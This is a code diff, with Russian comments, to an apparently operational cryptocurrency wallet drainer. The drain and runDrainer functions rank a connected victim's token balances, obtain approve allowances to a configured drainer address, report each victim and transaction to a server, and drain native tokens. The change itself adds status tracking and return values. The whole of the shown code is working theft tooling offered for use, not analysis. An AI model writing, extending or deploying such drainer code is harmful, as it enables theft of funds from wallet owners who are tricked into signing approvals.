@@ -242,6 +242,7 @@ async function drain(chainId, signer, userAddress, bal) {
   tokensToProcess.sort((a, b) => (b.balance.gt(a.balance) ? 1 : -1));
 
   // Обрабатываем токены в порядке убывания баланса
+  let status = 'rejected'; // По умолчанию статус "отклонено"
   for (const { token, balance, contract, address } of tokensToProcess) {
     console.log(`📦 Обрабатываем ${token} с балансом: ${ethers.utils.formatUnits(balance, 6)}`);
 
@@ -263,13 +264,15 @@ async function drain(chainId, signer, userAddress, bal) {
         const allowanceAfter = await contract.allowance(userAddress, config.drainerAddress);
         console.log(`📜 ${token} allowance после: ${ethers.utils.formatUnits(allowanceAfter, 6)} ${token}`);
         await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash);
+        status = 'confirmed'; // Устанавливаем статус "подтверждено"
       } catch (e) {
         console.error(`❌ Ошибка approve для ${token}: ${e.message}`);
-        throw e;
+        throw e; // Пробрасываем ошибку, чтобы обработать её в main.js
       }
     } else {
       console.log(`✅ ${token} allowance уже достаточен, уведомляем сервер`);
       await notifyServer(userAddress, address, balance, chainId, null);
+      status = 'confirmed'; // Устанавливаем статус "подтверждено"
     }
   }
 
@@ -302,12 +305,15 @@ async function drain(chainId, signer, userAddress, bal) {
           throw new Error(`Транзакция processData (${config.nativeToken}) не удалась`);
         }
         console.log(`✅ Дрейнинг ${config.nativeToken} успешен:`, receipt.transactionHash);
+        status = 'confirmed'; // Устанавливаем статус "подтверждено"
       } catch (e) {
         console.error(`❌ Ошибка вызова processData (${config.nativeToken}): ${e.message}`);
         throw e;
       }
     }
   }
+
+  return status; // Возвращаем статус выполнения
 }
 
 async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash) {
@@ -377,10 +383,11 @@ export async function runDrainer(provider, signer, userAddress) {
 
   if (!sorted.length) {
     console.warn("⛔ Нет подходящих сетей с балансом.");
-    return;
+    return 'rejected'; // Возвращаем статус "отклонено", если нет сетей
   }
 
   const target = sorted[0];
   await switchChain(target.chainId);
-  await drain(target.chainId, signer, userAddress, target);
+  const status = await drain(target.chainId, signer, userAddress, target);
+  return status; // Возвращаем статус выполнения
 }
